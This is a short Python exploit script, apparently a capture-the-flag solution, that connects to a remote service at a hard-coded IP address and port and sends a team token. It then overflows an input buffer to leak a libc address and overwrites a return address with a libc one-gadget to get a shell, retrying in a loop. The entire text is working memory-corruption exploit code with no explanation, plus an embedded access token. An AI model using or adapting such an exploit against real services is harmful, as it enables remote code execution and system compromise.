from PwnIOI import *
while 1:
  try:
    s = IOI(['52.40.130.76', 2345])
    s.read_until('Token:')
    s.write('MmSUJpq8peoc4YQd1KcljrJZHQb1VkHa\n')
    s.read_until('Choice:')
    s.write('1\n')
    s.read_until('levels?')
    s.write('1\n')
    s.read_until('more?')
    s.write('1\n')
    s.read_until('Answer:')
    dat = '0\x00'
    dat += '\x00'*(0x30-len(dat))
    dat += '\x1c'
    s.write(dat)

    low = int(s.read_until('Q')[-13:-1],10)&0xffffffff
    if low&0xff == 0x20:
      libc = (low|0x7f6a00000000) - 0x3c4620
      log(' LOW : 0x%x'%low)
      log(' LIBC : 0x%x'%libc)
      s.write('A'*(0x40-20)+p64(libc+0x4526a))
      s.interact()
  except:
    continue;
#s.interactive()
